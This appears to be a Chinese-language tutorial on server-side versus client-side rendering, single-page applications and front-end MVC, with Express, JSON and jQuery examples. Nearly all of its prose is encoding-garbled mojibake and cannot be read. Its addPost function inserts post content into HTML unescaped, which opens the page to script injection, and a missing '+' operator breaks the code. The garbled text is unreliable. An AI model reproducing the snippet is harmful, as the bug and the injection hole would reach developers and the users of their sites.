ç¸½è€Œè¨€ä¹‹ï¼Œæµç¨‹å¤§æ¦‚æ˜¯é€™æ¨£ï¼š

ç•¶ä½ æƒ³è¦è¨ªå•æ–‡ç« åˆ—è¡¨é€™å€‹é é¢çš„æ™‚å€™ï¼Œç€è¦½å™¨æœƒé€ request åˆ° serverï¼Œç„¶å¾Œç¶“é controller èˆ‡ modelï¼Œæœ€å¾ŒæŠŠè³‡æ–™å¸¶çµ¦ viewã€‚
view å†å›å‚³ä¸€ä»½å®Œæ•´çš„ HTML æª”æ¡ˆï¼ˆé€™å€‹å‹•ä½œå°±å«åš renderï¼‰ï¼Œè€Œç€è¦½å™¨æ‹¿åˆ°ä¹‹å¾Œï¼Œåªè¦é¡¯ç¤ºå‡ºä¾†å°±å¥½ã€‚å› ç‚º render åœ¨ server sideï¼Œæ‰€ä»¥é€™ä¹Ÿå«åš server side renderã€‚
é€™å€‹æµç¨‹ç…§ç†ä¾†èªªï¼Œæ‡‰è©²æœƒæ˜¯ä½ æœ€ç†Ÿæ‚‰çš„æµç¨‹ï¼Œå› ç‚ºä¸€å¤§å †ç¶²é éƒ½æ˜¯é€™å€‹æ¨£å­åšçš„ã€‚
åœ¨é€™å€‹ç‹€æ³åº•ä¸‹ï¼Œä¸€å€‹åªè² è²¬å‰ç«¯çš„å·¥ç¨‹å¸«ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è² è²¬ view é€™å€‹è³‡æ–™å¤¾åº•ä¸‹çš„æ‰€æœ‰æ±è¥¿ï¼Œå¿…é ˆç”¨æ¡†æ¶æä¾›çš„ template æŠŠè³‡æ–™è·Ÿ HTML æ•´åˆåœ¨ä¸€èµ·ã€‚è€Œç•¶ä»–éœ€è¦ debug çš„æ™‚å€™ï¼Œå¿…é ˆè¦æŠŠæ•´å€‹å°ˆæ¡ˆéƒ½è·‘èµ·ä¾†ï¼Œæ‰èƒ½çœ‹åˆ°ç•«é¢è¼¸å‡ºçš„çµæœã€‚
é€™æ¨£çš„å·¥ä½œæµç¨‹è®“å‰å¾Œç«¯åˆ‡å¾—æ²’æœ‰é‚£éº¼é–‹ï¼Œç•¢ç«Ÿå‰ç«¯å·¥ç¨‹å¸«é‚„éœ€è¦æœƒè·‘ railsï¼Œéœ€è¦è¨­å®š DBï¼Œæä¸å¥½é‚„è¦æœƒè¨­å®š nginxï¼
ç¾åœ¨çš„æ–¹æ³•é›–ç„¶æŠŠè³‡æ–™ï¼ˆModelï¼‰è·Ÿé¡¯ç¤ºï¼ˆViewï¼‰åˆ‡é–‹äº†ï¼Œä½†éƒ½é‚„æ˜¯åœ¨å¾Œç«¯ï¼Œæœ‰æ²’æœ‰æ›´å¥½çš„æ–¹æ³•å‘¢ï¼Ÿæœ‰æ²’æœ‰è¾¦æ³•ï¼Œè®“å¾Œç«¯å°ˆæ³¨åœ¨æä¾›è³‡æ–™ï¼Œå‰ç«¯å°ˆæ³¨åœ¨é¡¯ç¤ºè³‡æ–™å‘¢ï¼Ÿ
æœ‰ï¼
client side renderå‰›å‰›æˆ‘å€‘æåˆ°äº† server side renderï¼Œç”±å¾Œç«¯ç›´æ¥å›å‚³æ•´ä»½ HTMLï¼Œç€è¦½å™¨ç›´æ¥é¡¯ç¤ºå°±å¥½ï¼Œå› ç‚º response å°±æ˜¯å®Œæ•´çš„ç¶²é äº†ã€‚
ä½†æ—¢ç„¶æœƒç‰¹åˆ¥å€åˆ† server è·Ÿ clientï¼Œå°±ä»£è¡¨é‚„æœ‰ä¸€ç¨®æ–¹å¼å«åš client side renderï¼Œé€™åˆæ˜¯ä»€éº¼å‘¢ï¼Ÿ
å¤§å®¶éƒ½çŸ¥é“ï¼ŒJavaScript å¯ä»¥å‹•æ…‹çš„ç”¢ç”Ÿå…§å®¹ï¼Œè€Œ client side render æŒ‡çš„å°±æ˜¯ç•¶å‰ç«¯æ‹¿åˆ°è³‡æ–™ä»¥å¾Œï¼Œæ‰ç”¨ JavaScript å‹•æ…‹çš„æŠŠé‚£äº›å…§å®¹å¡«åˆ°ç¶²é ä¸Šé¢ã€‚
ç›´æ¥æ‹¿ç¨‹å¼ç¢¼å‡ºä¾†èªªæ˜ï¼Œå¤§å®¶æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘çš„ server ç¾åœ¨å°±åªå°ˆæ³¨åœ¨æä¾›è³‡æ–™ï¼Œæ‰€ä»¥å°±é–‹ä¸€å€‹ API å‡ºä¾†ï¼š
// é¦–é ï¼Œç›´æ¥è¼¸å‡ºæ‰€æœ‰ç•™è¨€app.get(&#x27;/&#x27;, function (req, res) &#123;    // å¾è³‡æ–™åº«æ‹¿å‡ºæ‰€æœ‰çš„ç•™è¨€  db.getPosts(function (err, posts) &#123;    if (err) &#123;      res.send(err);    &#125; else &#123;        // ç›´æ¥æŠŠæ‰€æœ‰ posts ä¸Ÿå‡ºå»      res.send(&#123;        posts: posts      &#125;);    &#125;  &#125;)&#125;);

å¦‚æœç”¨ç€è¦½å™¨æ‰“é–‹é€™å€‹ API çš„ç¶²å€ï¼Œæ‡‰è©²æœƒçœ‹åˆ° JSON æ ¼å¼çš„è³‡æ–™ï¼š
&#123;  &quot;posts&quot;: [    &#123;      &quot;_id&quot;: &quot;585f662a77467405888b3bbe&quot;,      &quot;author&quot;: &quot;huli&quot;,      &quot;content&quot;: &quot;2222&quot;,      &quot;createTime&quot;: &quot;2016-12-25T06:24:42.990Z&quot;    &#125;,    &#123;      &quot;_id&quot;: &quot;585f662777467405888b3bbd&quot;,      &quot;author&quot;: &quot;huli&quot;,      &quot;content&quot;: &quot;1111&quot;,      &quot;createTime&quot;: &quot;2016-12-25T06:24:39.601Z&quot;    &#125;  ]&#125;

å¾Œç«¯çš„éƒ¨åˆ†å·²ç¶“æº–å‚™å°±ç·’ï¼Œé †åˆ©åœ°æä¾›è³‡æ–™äº†ï¼Œå†ä¾†æˆ‘å€‘ä¾†çœ‹å‰ç«¯ï¼Œåªéœ€è¦ä¸€å€‹index.htmlå°±å¯ä»¥äº†ã€‚
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; /&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;  &lt;script&gt;    $(document).ready(function() &#123;      getPosts();    &#125;)      // ajax æŠ“å–æ–‡ç«     function getPosts() &#123;      $.ajax(&#123;        url: &#x27;http://localhost:3000/&#x27;,        success: function(response) &#123;          if (!response.posts) &#123;            return alert(&#x27;Error&#x27;);          &#125;          for(var i = 0; i &lt; response.posts.length; i++) &#123;              // ä¸Ÿçµ¦ render function            addPost(response.posts[i]);          &#125;        &#125;,        error: function(err) &#123;          console.log(err);          alert(&#x27;æŠ“å–å¤±æ•—&#x27;);        &#125;      &#125;)    &#125;      function addPost(post) &#123;      var item = &#x27;&#x27; +         &#x27;&lt;div class=&quot;panel panel-default&quot;&gt;&#x27; +          &#x27;&lt;div class=&quot;panel-heading&quot;&gt;&#x27; +            &#x27;&lt;h3 class=&quot;panel-title&quot;&gt;&#x27; + post.author +&#x27;, ç™¼ä½ˆæ™‚é–“ï¼š&#x27; + post.createTime + &#x27;&lt;/h3&gt;&#x27; +          &#x27;&lt;/div&gt;&#x27; +          &#x27;&lt;div class=&quot;panel-body&quot;&gt;&#x27; +            post.content          &#x27;&lt;/div&gt;&#x27; +        &#x27;&lt;/div&gt;&#x27;;      $(&#x27;.posts&#x27;).append(item);    &#125;  &lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;a class=&quot;btn btn-primary&quot; href=&quot;/posts&quot;&gt;ç™¼è¡¨æ–°ç•™è¨€&lt;/a&gt;    &lt;h2&gt;ç•™è¨€åˆ—è¡¨&lt;/h2&gt;    &lt;div class=&quot;posts&quot;&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

æ¥è‘—æ‰“é–‹ index.htmlï¼Œå°±å¯ä»¥çœ‹åˆ°é æœŸä¸­çš„ç•«é¢å‡ºç¾äº†ï¼Œè·Ÿæˆ‘å€‘ä¹‹å‰ç”¨ server side render ç”¢ç”Ÿçš„ç•«é¢æ‡‰è©²ä¸€æ¨¡ä¸€æ¨£ã€‚ç”¨å³éµ -&gt; æª¢æŸ¥å»æª¢è¦–ï¼Œæœƒç™¼ç¾æ‰€æœ‰å…ƒç´ éƒ½åœ¨ã€‚

ä½†æ˜¯å¦‚æœä½ æ”¹ç”¨å³éµ -&gt; æª¢è¦–åŸå§‹ç¢¼ï¼Œæœƒç™¼ç¾å¹¾ä¹æ˜¯ç©ºçš„ï¼š

é€™å€‹å°±æ˜¯ client side render è·Ÿ server side render æœ€å¤§çš„å·®åˆ¥ã€‚å› ç‚ºå°æ–¼å‰è€…ï¼Œæˆ‘å€‘æ˜¯åœ¨åŸ·è¡ŒæœŸé–“ã€Œå‹•æ…‹ã€å»è·Ÿå¾Œç«¯ä¼ºæœå™¨æ‹¿è³‡æ–™ï¼Œå†å‹•æ…‹ç”¢ç”Ÿä½ çœ‹åˆ°çš„é‚£äº›å…ƒç´ ã€‚
è€Œé‚£äº›å…ƒç´ åŸæœ¬ä¸å­˜åœ¨ index.html è£¡é¢ï¼Œæ˜¯æˆ‘å€‘å¾Œä¾†è‡ªå·±ç”¨ jQuery append ä¸Šå»çš„ï¼Œæ‰€ä»¥æª¢è¦–åŸå§‹ç¢¼ç•¶ç„¶ä¸æœƒå‡ºç¾ä»»ä½•æ±è¥¿ã€‚
æˆ‘å€‘ä¾†çœ‹ä¸€å¼µ client side render çš„ç¤ºæ„åœ–ï¼š

åœ¨ server side çš„åœ°æ–¹ï¼Œview é€™å±¤ç›´æ¥è¢«å¿½ç•¥äº†ï¼Œå› ç‚ºå¾Œç«¯åªè¼¸å‡º JSON æ ¼å¼çš„è³‡æ–™è€Œå·²ï¼Œè€Œé€™é‚Šçš„ç¬¬äº”æ­¥ï¼šæŠŠå‚³å›ä¾†çš„è³‡æ–™ render æˆ HTML æŒ‡çš„å°±æ˜¯æˆ‘å€‘ä¸Šé¢é‚£å€‹ç”¨ jQuery å‹•æ…‹ append ä¸Šå»çš„æ­¥é©Ÿã€‚
è€Œåœ¨é€™ç¨®ç‹€æ³åº•ä¸‹ï¼Œä½ æœ‰æ²’æœ‰ç™¼ç¾å‰å¾Œç«¯å·²ç¶“åˆ‡é–‹äº†ï¼Ÿ
å¾Œç«¯å·¥ç¨‹å¸«å¾æ­¤ä¹‹å¾Œä¸ç”¨å†ç®¡ view è£¡é¢åˆ°åº•è£ä»€éº¼ï¼Œä¸ç”¨å†æ•™å‰ç«¯å·¥ç¨‹å¸«æ€éº¼è·‘ railsï¼Œä»–åªè¦è² è²¬åˆ¶å®š API æ–‡ä»¶ï¼Œæä¾›å‰ç«¯éœ€è¦çš„è³‡æ–™å°±å¥½ã€‚
è€Œå‰ç«¯å·¥ç¨‹å¸«ä¹Ÿä¸éœ€è¦è·‘é‚£äº›æœå‹™äº†ï¼Œåªéœ€è¦ç”¨ä»–å€‘æœ€ç†Ÿæ‚‰çš„ç€è¦½å™¨æ‰“é–‹ HTML æª”æ¡ˆå°±è¡Œäº†ï¼Œåˆ©ç”¨ ajax å¾å¾Œç«¯æ‹¿è³‡æ–™ï¼Œä¸¦ä¸”åœ¨è‡ªå·±é€™é‚Šç”¨ JavaScript å‹•æ…‹ç”¢ç”Ÿå…§å®¹ã€‚
åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œå‰å¾Œç«¯çš„éƒ¨ç½²ä¹Ÿå¯ä»¥å®Œå…¨æ‹†é–‹ï¼Œå‰ç«¯çš„éƒ¨åˆ†æœ€ç°¡å–®ï¼Œåªéœ€è¦éš¨ä¾¿æ‰¾ä¸€å€‹å¯ä»¥æ”¾ html æª”æ¡ˆçš„åœ°æ–¹å°±å¥½ï¼Œä¾‹å¦‚èªª Amazon S3ã€‚æ‰€ä»¥å‰ç«¯å¹¾ä¹ä¸æœƒæœ‰æ›æ‰çš„å•é¡Œï¼Œä¹Ÿä¸æœƒæœ‰æµé‡çš„å•é¡Œï¼Œå› ç‚ºå®ƒåªæ˜¯å€‹éœæ…‹æª”æ¡ˆè€Œå·²ã€‚
å‡å¦‚ server æœ‰ä¸€å¤©æ›äº†ï¼ŒAPI ä¹Ÿè·Ÿè‘—æ›äº†ï¼Œä½¿ç”¨è€…ä¾ç„¶å¯ä»¥é€ è¨ªç¶²é ï¼Œåªæ˜¯çœ‹ä¸åˆ°è³‡æ–™è€Œå·²ï¼Œæˆ–è€…æ˜¯ä½ å¯ä»¥é¡¯ç¤ºå‡ºä¸€å€‹éŒ¯èª¤çš„åœ–æ¡ˆã€‚ä½†å¦‚æœæ˜¯èˆŠçš„é‚£ç¨®ç¶åœ¨ä¸€èµ·çš„æ¶æ§‹ï¼Œserver ä¸€æ—¦æ›æ‰ï¼Œä½ é€£ç•«é¢éƒ½æ¸²æŸ“ä¸å‡ºä¾†ã€‚
å†è€…ï¼Œå› ç‚ºç¾åœ¨æŠŠ data è·Ÿ view å®Œå…¨åˆ‡é–‹ä¾†ï¼Œä½ è¦æ›¿æ›ä»»ä½•ä¸€é‚Šéƒ½æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚ä¾‹å¦‚èªªä½ å¾Œç«¯ä¸æƒ³ç”¨ rails äº†ä½ è¦ç”¨ goï¼Œå®Œå…¨æ²’å•é¡Œï¼åªè¦ä¿æŒ API çš„æ ¼å¼ä¸€æ¨£ï¼Œä½ å¾Œç«¯å°±ç®—è¦ç”¨ C ä¹Ÿæ²’äººç®¡ä½ ã€‚
å‰ç«¯ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œä½ è¦é¸ Angularï¼Œé¸ React æˆ–æ˜¯é¸ Vue ç”šè‡³ä½ è¦æ‰‹åˆ»éƒ½å¯ä»¥ï¼Œåæ­£éƒ½ä¸é—œå¾Œç«¯å·¥ç¨‹å¸«çš„äº‹æƒ…ã€‚
å¯æ˜¯ï¼Œäº‹æƒ…æ²’é‚£éº¼ç°¡å–®é›–ç„¶é€™ç¨®å ´æ™¯è½èµ·ä¾†å¾ˆç¾å¥½ï¼Œä½†åƒè¬ä¸è¦å¿½ç•¥äº†é€™æ¨£å­çš„æ”¹è®Šæœƒé€ æˆçš„å¾Œæœã€‚
ä»€éº¼å¾Œæœï¼Ÿé‚£å°±æ˜¯å‰ç«¯æœƒè®Šå¾—æœ‰å¤ è¤‡é›œã€‚
ä»”ç´°æƒ³æƒ³æˆ‘å€‘ä¸€é–‹å§‹æåˆ°çš„é‚£ç¨®é–‹ç™¼æ¶æ§‹ï¼Œçµ±ä¸€å¾å¾Œç«¯ renderï¼Œæ‰€ä»¥æˆ‘ä¸€å€‹é é¢å°±æº–å‚™ä¸€å€‹ view çš„æª”æ¡ˆï¼Œå¦‚æœä½¿ç”¨è€…è¨ªå•/postsï¼Œæˆ‘å°±render(&#39;posts.ejs&#39;)ï¼›è‹¥æ˜¯è¨ªå•/aboutï¼Œæˆ‘å°±render(&#39;about.ejs&#39;)ã€‚
ç¬¬ä¸€å€‹å•é¡Œä¾†äº†ï¼š

æ—¢ç„¶å‰›å‰›èªªå‰ç«¯åªæœ‰ä¸€å€‹ index.htmlï¼Œé‚£ä¸å°±ä»£è¡¨ä½¿ç”¨è€…è¨ªå• /postsè·Ÿè¨ªå•/aboutï¼Œéƒ½æ˜¯åˆ°åŒä¸€å€‹æª”æ¡ˆï¼Ÿé‚£æˆ‘è¦æ€éº¼æ¸²æŸ“ä¸åŒé é¢ï¼Ÿ

å› ç‚ºåœ¨ä»¥å¾€ï¼Œè·¯ç”±çš„éƒ¨åˆ†æ˜¯ server è² è²¬ï¼Œå°±å¦‚åŒæˆ‘ä¸Šé¢èªªçš„ä¸€æ¨£ï¼Œserver ä¾æ“šä¸åŒçš„è·¯ç”±ä¾†æ±ºå®šè¦æ¸²æŸ“å“ªä¸€å€‹é é¢ã€‚å¯æ˜¯ç¾åœ¨åˆ‡é–‹ä¹‹å¾Œï¼Œå‰ç«¯åªå‰©ä¸‹ä¸€å€‹ index.html äº†ï¼Œé‚£æ€éº¼è¾¦å‘¢ï¼Ÿ
åªå¥½è®“å‰ç«¯ä¾†è² è²¬äº†ã€‚
å‰ç«¯å¯ä»¥é€éwindow.locationæˆ–è€…æ˜¯ history API ä¾†ç®¡ç†ç¶²å€ï¼Œå°±å¯ä»¥çŸ¥é“ä½¿ç”¨è€…ç¾åœ¨æƒ³è¦é€ è¨ªå“ªä¸€å€‹é é¢ã€‚
é€™é‚Šæœ‰ä¸€å€‹å°ç´°ç¯€ç¨å¾®æä¸€ä¸‹ï¼Œé‚£å°±æ˜¯å‰›å‰›è¬›éå‰ç«¯åªæœ‰ä¸€å€‹ html æª”æ¡ˆï¼Œæ‰€ä»¥ç¶²å€å¯èƒ½åƒæ˜¯é€™æ¨£ï¼šhttps://example.com/index.htmlã€‚
åªæœ‰ä¸€å€‹ç¶²å€è€Œå·²ï¼Œæ€éº¼çŸ¥é“ä½¿ç”¨è€…è¦é€ è¨ªå“ªä¸€å€‹é é¢ï¼Ÿ
åœ¨ä»¥å‰æˆ‘å€‘è¦é€ è¨ªpostsçš„è©±ï¼Œç¶²å€å¯èƒ½æœƒæ˜¯ï¼šhttps://example.com/postsï¼Œå¯æ˜¯ç¾åœ¨æˆ‘å€‘å‰ç«¯å·²ç¶“è®Šæˆä¸€å€‹éœæ…‹æª”æ¡ˆäº†ï¼Œåªæœ‰é‚£ä¸€å€‹è·¯å¾‘è€Œå·²ï¼Œè©²æ€éº¼åšå‘¢ï¼Ÿ
ç¬¬ä¸€ç¨®æ–¹æ³•æ˜¯åˆ©ç”¨ hashï¼Œä¾‹å¦‚èªªhttps://example.com/index.html#postsï¼Œå‰ç«¯å†å»è§£æå¾Œé¢çš„å­—ä¸²ã€‚
ç¬¬äºŒç¨®æ˜¯åˆ©ç”¨nginxæˆ–å…¶ä»–é¡ä¼¼çš„æœå‹™ï¼ŒæŠŠæ‰€æœ‰https://example.com/*çš„ç¶²å€éƒ½ä¸€å¾‹è¼¸å‡º index.html é€™å€‹æª”æ¡ˆï¼Œé€™æ¨£å­çœ‹èµ·ä¾†å°±æœƒè·Ÿä»¥å‰ä¸€æ¨£äº†ã€‚
æˆ‘åˆ°/postsï¼Œserver æœƒå›å‚³ index.htmlï¼Œæˆ‘åˆ°/about server ä¹Ÿæœƒå›å‚³ä¸€æ¨£çš„å…§å®¹ã€‚
ä½†ç¸½ä¹‹å‘¢ï¼Œå› ç‚ºå¾Œç«¯ä¸å†è™•ç†é€™é‚Šçš„è·¯ç”±äº†ï¼Œæ‰€ä»¥é€™å€‹éƒ¨åˆ†å®Œå…¨è½‰äº¤çµ¦å‰ç«¯è² è²¬ï¼Œä½ å¿…é ˆåœ¨å‰ç«¯è‡ªå·±ç®¡ç† URL çš„ç‹€æ…‹ï¼Œå»æ±ºå®šç¾åœ¨è¦é¡¯ç¤ºå“ªä¸€å€‹é é¢ã€‚
é‚£é€™é‚Šè¦æ€éº¼åšå‘¢ï¼Ÿæœ€ç°¡å–®çš„æ–¹æ³•å°±æ˜¯è·Ÿä»¥å¾€å¾Œç«¯åšæ³•ä¸€æ¨£ï¼Œä½ åˆ°å“ªä¸€å€‹ç¶²å€ï¼Œæˆ‘å°±æ ¹æ“šç¶²å€è¼¸å‡ºæ€æ¨£çš„æ±è¥¿ã€‚
å‰ç«¯çš„ç¨‹å¼ç¢¼å¤§æ¦‚æœƒé•·é€™æ¨£ï¼š
function render(path) &#123;  // æ¸…ç©ºæ•´å€‹ç•«é¢  $(body).empty();  if (path === &#x27;posts&#x27;) &#123;    renderPostsPage();  &#125; else if (path === &#x27;about&#x27;) &#123;    renderAboutPage();  &#125;&#125;

åªè¦æ¯ä¸€æ¬¡åˆ°ä¸€å€‹æ–°çš„ç¶²å€ï¼Œæˆ‘å°±æŠŠç¾åœ¨å…§å®¹å…¨éƒ¨æ¸…ç©ºå†æ¸²æŸ“ä¸€æ¬¡å°±å¥½ã€‚
æ˜¯å¾ˆç°¡å–®æ²’éŒ¯ï¼Œä½†æ˜¯æ•ˆèƒ½æœ‰å¤§å¤§çš„å•é¡Œï¼Œå› ç‚ºæœ‰äº›éƒ¨åˆ†ä½ å…¶å¯¦æ ¹æœ¬ä¸ç”¨æ¸…ç©ºã€‚ä¾‹å¦‚èªªç¶²ç«™æœ€ä¸Šæ–¹æœƒæœ‰çš„å°è¦½åˆ—è·Ÿæœ€ä¸‹é¢çš„ footerï¼ŒåŸºæœ¬ä¸Šæ¯ä¸€å€‹é é¢éƒ½æœ‰ï¼Œæ˜¯ä¸æœƒè®Šçš„ã€‚
é‡å°é‚£äº›ä¸è®Šçš„éƒ¨åˆ†ï¼Œæ‡‰è©²ä¿ç•™èµ·ä¾†æ‰å°ï¼Œä¸ç„¶æ¯ä¸€æ¬¡éƒ½æ¸…ç©ºé‡å»ºä¸€æ¨£çš„æ±è¥¿å¾ˆæ²’æœ‰æ•ˆç‡ã€‚ä½ å¯èƒ½æœƒèªªé€™ä¸å°±è·Ÿå¾Œç«¯ä»¥å‰å¯« view ä¸€æ¨£ï¼ŒæŠ½å‡ºå…±é€šçš„éƒ¨åˆ†ç„¶å¾Œæ”¾åœ¨ layout è£¡é¢ä¹‹é¡çš„ã€‚
ä¸ä¸ï¼Œé€™ä¸ä¸€æ¨£ã€‚å¾Œç«¯ render æœ¬è³ªä¸Šå°±æ˜¯ã€Œæ¯ä¸€å€‹ä¸åŒé é¢å°±å›å‚³ä¸€ä»½ä¸åŒçš„ html æª”æ¡ˆã€ï¼Œè€Œæˆ‘å€‘ç¾åœ¨å‰ç«¯ render å…¶å¯¦ä¹Ÿæœ‰æŠŠå…±é€šçš„éƒ¨åˆ†æŠ½å‡ºä¾†ï¼Œä½†å‰ç«¯çš„é›£é¡Œåœ¨ï¼šã€Œè¦æ€éº¼åªæ›´æ–°éƒ¨åˆ†ç•«é¢ï¼Œè€Œä¸æ˜¯æš´åŠ›çš„æ¯æ¬¡éƒ½ç æ‰é‡ç·´ã€ã€‚
ä½ æœ‰æ²’æœ‰é–‹å§‹æ¼¸æ¼¸è¦ºå¾—å‰ç«¯è¶Šä¾†è¶Šå¤šäº‹æƒ…è¦åšäº†ï¼Ÿ
Single Page Applicationç•¶ä½ æŠŠé€™ç¨®æ±è¥¿ç™¼æ®åˆ°æ¥µè‡´ï¼Œæœƒè¦ºå¾—å¾ˆåƒåœ¨å¯«ä¸€å€‹ App ä¸€æ¨£ï¼Œé€™æ±è¥¿å°±å«åš SPAï¼ŒSingle Page Applicationã€‚
å°±å¦‚åŒå­—é¢ä¸Šçš„æ„æ€ä¸€æ¨£ï¼Œæˆ‘å€‘ç¾åœ¨åªæœ‰ä¸€å€‹ index.html æª”æ¡ˆï¼Œä½†æ˜¯ç”¨èµ·ä¾†å»åƒä¸€å€‹ Appã€‚
æœ€ç¶“å…¸çš„ä¾‹å­å°±æ˜¯ Gmailã€‚ä½ åœ¨ç”¨ Gmail çš„æ™‚å€™ï¼Œå®Œå…¨æ²’æœ‰æ›é ã€‚å…¨éƒ¨çš„å‹•ä½œéƒ½æ˜¯åœ¨ã€ŒåŒä¸€å€‹é é¢ã€ä¸Šé¢ç™¼ç”Ÿçš„ï¼Œæ‰€ä»¥ä½ è¼‰å…¥çš„æª”æ¡ˆå¾é ­åˆ°å°¾å°±åªæœ‰ä¸€å€‹ index.htmlï¼Œå®Œå…¨æ²’æœ‰æ›éã€‚
ä½ åœ¨ Gmail ä¸Šé¢åšçš„ä»»ä½•å‹•ä½œï¼Œéƒ½æ˜¯ç”¨ ajax ç™¼ request çµ¦ serverï¼Œserver å›å‚³è³‡æ–™ä»¥å¾Œ client ç«¯å†ç”¨ JavaScript æŠŠç•«é¢ render å‡ºä¾†ã€‚
æ‰€ä»¥ä½ åœ¨ç”¨ Gmail çš„æ™‚å€™ï¼Œæœƒæ„Ÿè¦ºå¥½åƒåœ¨ç”¨ä¸€å€‹ App è€Œä¸æ˜¯åœ¨ç”¨ç¶²é ï¼Œå› ç‚ºé é¢ä¹‹é–“çš„è·³è½‰å¾ˆæµæš¢ï¼Œä¸åƒä¸€èˆ¬ç¶²é ä¸­é–“å¯èƒ½æœƒæœ‰ç™½å±å‡ºç¾ã€‚
æ—¢ç„¶éƒ½å«åš Application äº†ï¼Œé€™æ™‚å€™çš„å‰ç«¯å·¥ç¨‹å¸«å·²ç¶“ä¸æ˜¯å¤§å®¶ä»¥å¾€æƒ³åƒçš„é‚£æ¨£ï¼Œåªéœ€è¦æœƒ HTML è·Ÿ CSS åˆ»åˆ»ç•«é¢ï¼Œç”¨ JavaScript åšé»å°ç‰¹æ•ˆè·Ÿäº’å‹•ã€‚
è¦å¯« SPA çš„è©±ï¼Œæœ€é›£çš„å°±æ˜¯ç‹€æ…‹çš„ç®¡ç†ã€‚å› ç‚ºå¾ˆå¤šæ±è¥¿ä»¥å‰å¾Œç«¯éƒ½å¹«ä½ åšæ‰äº†ï¼Œæ‰€ä»¥ä½ å®Œå…¨ä¸ç”¨è€ƒæ…®é€™ä»¶äº‹ï¼Œä½†ç¾åœ¨è¦äº†ã€‚
èˆ‰å€‹ä¾‹å­å¥½äº†ï¼Œä»¥å‰ä½ è¨ªå•ä¸€ç¯‡æ–‡ç« ï¼Œå‡è¨­æ˜¯/post/12ï¼Œä¸€é»ä¸‹å»ä¹‹å¾Œå¿«é€Ÿåˆ‡å›é¦–é å†é»æ“Šå…¶ä»–æ–‡ç« ï¼Œserver ä¹Ÿå°±åªæ˜¯å†å›å‚³ç›¸å°æ‡‰çš„ HTML è€Œå·²ã€‚
å¯æ˜¯å‘¢ï¼ŒSPA å°±ä¸ä¸€æ¨£äº†ï¼Œè€ƒæ…®ä¸€ä¸‹ä¸‹é¢çš„æµç¨‹ï¼š

ä½¿ç”¨è€…é»æ“Š/post/12
query API
ä½¿ç”¨è€…è¿”å›é¦–é 
ä½¿ç”¨è€…é»æ“Š/posts/13
query API
æ‹¿åˆ° responseï¼Œæ¸²æŸ“é é¢

å‡è¨­ä½¿ç”¨è€…é»æ“Šçš„é€Ÿåº¦å¾ˆå¿«ï¼Œåœ¨ç¬¬ä¸ƒæ­¥çš„æ™‚å€™ï¼Œå¾ˆæœ‰å¯èƒ½æœƒå…ˆæ‹¿åˆ°ç¬¬äºŒæ­¥çš„ responseï¼Œå°±æœƒç™¼ç”Ÿä½¿ç”¨è€…æ˜æ˜é»é€²å» A æ–‡ç« ï¼Œå…§å®¹å»æ˜¯ B æ–‡ç« çš„ç‹€æ³ã€‚
é€™åªæ˜¯ä¸€å€‹ç°¡å–®çš„ä¾‹å­ï¼Œå¯¦æˆ°ä¸Šé‚„æœ‰ä¸€å¤§å †è¦è€ƒæ…®çš„å•é¡Œï¼Œä¾‹å¦‚èªªé‚„æ²’æœ‰æ‹¿åˆ°è³‡æ–™çš„æ™‚å€™è¦é¡¯ç¤ºä»€éº¼ï¼Œæ‹¿åˆ°ä¹‹å¾Œè¦æ€éº¼æ›´æ–°ç­‰ç­‰ã€‚
å‰ç«¯ MVCåœ¨å‰ç«¯è®Šå¾—æ„ˆä¾†æ„ˆè¤‡é›œä¹‹å¾Œï¼Œä½ æ‡‰è©²ä¹Ÿèƒ½ç†è§£ç‚ºä»€éº¼å‰ç«¯éœ€è¦ MVC äº†ã€‚å¦‚æœä½ æœ‰å¯«éç´” PHPï¼Œç¶“æ­·éé‚£ç¨®å•†æ¥­é‚è¼¯è·Ÿ view è·Ÿ model æ··é›œåœ¨åŒä¸€å€‹æª”æ¡ˆçš„æ™‚æœŸï¼Œæ‡‰è©²ä¹Ÿå¾ˆèƒ½ç†è§£ç‚ºä»€éº¼éœ€è¦ MVCã€‚
å› ç‚ºæˆ‘å€‘è¦æŠŠè·è²¬åˆ‡é–‹ä¾†å˜›ï¼Œè®“å¤§å®¶å„è‡ªè² è²¬è©²è² è²¬çš„æ±è¥¿ï¼Œæ‰ä¸æœƒå…¨éƒ¨æ··åœ¨ä¸€èµ·è®Šæˆç¾©å¤§åˆ©éºµã€‚
å‰ç«¯ MVC å…¶å¯¦è·Ÿå¾Œç«¯ MVC æ»¿é¡ä¼¼ï¼Œç„¶å¾Œå‰ç«¯ä¹Ÿè¦è¨­å®šè·¯ç”±ï¼Œå‰›å‰›æœ‰æéäº†ã€‚å°±æ˜¯è¨­å®šå“ªä¸€å€‹ URL è¦å»å“ªä¸€å€‹ Controllerï¼Œå†å»ç›¸å°æ‡‰çš„ Model æ‹¿è³‡æ–™ï¼Œæœ€å¾Œè¼¸å‡º Viewã€‚
é€™é‚Šç¨å¾®æ¯”è¼ƒä¸€ä¸‹å‰å¾Œç«¯çš„ MVC åœ¨åšçš„äº‹æƒ…ï¼š



&nbsp;
å‰ç«¯
å¾Œç«¯



Model
å»è·Ÿå¾Œç«¯ API æ‹¿è³‡æ–™
å»è·Ÿ DB æ‹¿è³‡æ–™


View
åœ¨å‰ç«¯å‹•æ…‹ç”¢ç”Ÿç•«é¢
ç„¡


Controller
å‘¼å«ç›¸å°æ‡‰çš„ Model ä¸¦ render ç•«é¢
å‘¼å«ç›¸å°æ‡‰çš„ Model ä¸¦å‚³å›è³‡æ–™



